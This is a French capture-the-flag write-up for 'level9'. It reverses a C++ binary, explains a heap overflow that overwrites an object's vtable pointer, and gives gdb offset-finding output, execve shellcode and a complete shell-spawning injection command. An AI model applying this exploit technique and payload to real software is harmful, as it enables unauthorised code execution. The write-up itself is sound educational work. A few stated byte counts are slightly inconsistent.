# level9 — overflow + shellcode

    void __thiscall N::N(N *this,int param_1)
    {
        *(undefined ***)this = &PTR_operator__08048848;

        *(int *)(this + 0x68) = param_1;

        return;
    }

    void __thiscall N::setAnnotation(N *this,char *param_1)
    {
        size_t __n;
        __n = strlen(param_1);

        memcpy(this + 4,param_1,__n);

        return;
    }

    void main(int param_1,int param_2)
    {
        N *this;
        N *this_00;
        
        if (param_1 < 2) {
                            // WARNING: Subroutine does not return
            _exit(1);
        }
        this = operator_new(0x6c);
        N::N(this,5);
        this_00 = operator_new(0x6c);
        N::N(this_00,6);
        N::setAnnotation(this,*(char **)(param_2 + 4));
        (*(code *)**(undefined4 **)this_00)(this_00,this);
        return;
    }

version clair :

    class N {

    /* 
    * --- INVISIBLE (Généré par le compilateur) ---
    * void* vptr;  
    * 
    * Le compilateur place secrètement ce pointeur à l'offset 0x00 
    * de l'objet parce qu'il détecte le mot-clé "virtual" plus bas.
    * C'est CE pointeur qui se fait écraser par le débordement.
    * ---------------------------------------------
    */

    private:
        char buffer[104]; // Se retrouve décalé à l'offset 0x04
        int param;        // Se retrouve décalé à l'offset 0x68 (104)

    public:
        N(int val) {
            /* 
            * --- INVISIBLE (Généré par le compilateur) ---
            * this->vptr = 0x08048848; 
            * 
            * Avant même d'exécuter la ligne suivante, le compilateur 
            * lie l'objet à sa table de fonctions virtuelles (vtable).
            * ---------------------------------------------
            */
            param = val;
        }

        virtual int operator+(N& other);
        virtual int operator-(N& other);

        void setAnnotation(char* input) {
            memcpy(this->buffer, input, strlen(input)); 
        }
    };

    int main(int argc, char** argv) {
        if (argc < 2) {
            _exit(1);
        }

        N* obj1 = new N(5);
        N* obj2 = new N(6);

        obj1->setAnnotation(argv[1]);

        *obj2 + *obj1; 

        return 0;
    }


avant:

    [ Objet 1 ] (108 octets)
    0x0804a008 : +-----------------------+
                | vptr (pointeur obj1)  | ---> Pointera vers VTABLE de N
    0x0804a00c : | buffer (104 octets)   |
                +-----------------------+
    [ Objet 2 ] (108 octets - Alloué juste en dessous)
    0x0804a074 : +-----------------------+ 
                | vptr (pointeur obj2)  | ---> Pointera vers VTABLE de N
    0x0804a078 : | buffer (104 octets)   |
                +-----------------------+

apres: 

    [ Objet 1 ] 
    0x0804a008 : +-----------------------+
                | vptr (pointeur obj1)  |
    0x0804a00c : | [ Fausse vtable ]     | \
    0x0804a010 : | [ Shellcode ]         |  |-- Copié par memcpy()
                | [ Bourrage (A x 76) ] | /
                +-----------------------+
    [ Objet 2 ] 
    0x0804a074 : +-----------------------+ 
                | ADRESSE : 0x0804a00c  | ---> Le vptr de l'Objet 2 est ÉCRASÉ.
    0x0804a078 : | buffer corrompu       |      Il pointe désormais vers la 
                +-----------------------+      [ Fausse vtable ] dans l'Objet 1.




**Trouver l'offset**

    (gdb) r 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaa'
        Program received signal SIGSEGV, Segmentation fault.
        0x08048682 in main ()
    (gdb) info registers
    eax            0x62616163	1650549091
    ecx            0x6175	24949
    edx            0x804a0c3	134521027
    ebx            0x804a078	134520952

    ret eax = 62616163 = caab = offset 108
    this ebx =  804a078  = 134520952 - offset 108 = 134520844 = 804A00C addr vtable


**payload**

    execve("/bin//sh", NULL, NULL);

    \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80


adresse-vers-le-shellcode qui ecrase la vtable (4) + shellcode (28) + bourrage jusqu'à l'offset 108 (83) + adresse du buffer, écrasant le faux "vtable pointer" (4) = 112 octets :

    (printf '\x10\xa0\x04\x08'; printf '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'; printf 'A%.0s' {1..83} printf '\x0c\xa0\x04\x08')

**injection**

    ./level9 "$(printf '\x10\xa0\x04\x08'; printf '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'; printf 'A%.0s' {1..83}; printf '\x0c\xa0\x04\x08')"